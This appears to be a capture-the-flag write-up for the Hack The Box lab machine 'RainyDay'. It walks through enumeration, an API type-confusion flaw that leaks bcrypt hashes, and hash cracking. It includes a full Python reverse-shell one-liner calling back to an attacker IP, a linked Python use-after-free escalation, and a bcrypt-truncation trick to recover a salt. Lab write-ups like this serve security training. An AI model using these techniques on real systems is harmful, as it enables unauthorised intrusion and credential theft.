IP: 10.10.11.184
# Enumeration
## Nmap
```bash
nmap -sC -sV -oA nmap/rainyday 10.10.11.184

Starting Nmap 7.80 ( https://nmap.org ) at 2023-02-19 18:23 AEDT
Nmap scan report for 10.10.11.184
Host is up (0.013s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://rainycloud.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Hostname `rainycloud.htb`

## Port 80
Error page is for flask which means the backend will be python.

User Jack, also a login page.

## Gobuster
```bash
gobuster dir -u http:/raincloud.htb/ -w /opt/
```

There is a api page.
```
# API v0.1
Welcome to the RainyCloud dev API. This is UNFINISHED and should not be used without permission.
Endpoint
Description
/api/
This page
/api/list
Lists containers
/api/healthcheck
Checks the health of the website (path, type and pattern parameters only available internally)
/api/user/<id>
Gets information about the given user. Can only view current user information
```

Checking the id functionality. It says not allowed, but you can do type confusion due to how python works. `1.0` will be a string but will be converted to `1` due to python's `int()` method.

```
{"id":1,"password":"$2a$10$bit.DrTClexd4.wVpTQYb.FpxdGFNPdsVX8fjFYknhDwSxNJh.O.O","username":"jack"}
{"id":2,"password":"$2a$05$FESATmlY4G7zlxoXBKLxA.kYpZx8rLXb2lMjz3SInN4vbkK82na5W","username":"root"}
{"id":3,"password":"$2b$12$WTik5.ucdomZhgsX6U/.meSgr14LcpWXsCA0KxldEw8kksUtDuAuG","username":"gary"}
```

Passwords are bcrypt. Cracking with hashcat and using rockyou.txt

```
gary:$2b$12$WTik5.ucdomZhgsX6U/.meSgr14LcpWXsCA0KxldEw8kksUtDuAuG:rubberducky
```

# Website
Can create a container and run shell commands. Python reverse shell as there is no bash.

```bash
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.22",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

# Foothold on container
`ps` shows a weird proc running which has `$HOME` set to `/home/jack` even tho jack is not a user on the container.

Running `ls -la` shows that `cwd` is mounted to `/home/jack` this also contains a ssh key :)

# Foothold on the box
user.txt
```
d43ee3f6126264c20013d9a07434d9d0
```

sudo -l can run `/usr/bin/safe_python` as jack_adm

# Priv esc to jack_adm
Can't create a shell but can read a file.

Check for ssh key.

```python
print(open("/home/jack_adm/.ssh/id_rsa").read())
```

No file found :(

There is a useafterfree exploit on the python binary that we can try. [link](https://github.com/kn32/python-buffered-reader-exploit/blob/master/exploit.py)

This works!

Create a ssh key, and login as jack_adm

# Priv esc to root
`sudo -l` again and can run `hash_password.py`

Running the file and trying to crack the hash generated didnt work. Which means its added some sort of salt.

Bcrypt has a password length of 72 anymore and it will start to break. The app wont let us go past 30. :(

UNICODE EMOJIS BYPASS (i hate this more than you do so dont worry)
💣 (get it cause bufferoverflow hehe (ippsec made this joke not me :) )) 

```
#19 bombs
$2b$05$tpsy7oF9kkxgPrM8QzNDyOGPPFmEOnAygoOUmQqpEdjszQpG3RkZ
#18 bombs
$2b$05$WOI.zEfF9tTrZOzqMQfiJe0wJlVLxL0jOxIoGgR4VI3CTr2CLAUr.
```

hashcat time.

This shows that the size is 18 bombs.

So now we can crack this one character at a time :skull:

After that is done its shows that the salt is `H34vyR41n`

So we can now try to crack the root hash from before while appened the salt to each entry in rockyou.txt

hashcat rule:
```
$H$3$4$v$y$R$4$1$n
```

Yay it works!

```
246813579H34vyR41n
```

root.txt
```
afebd30aaa6cfbe679cc9936e78c974d
```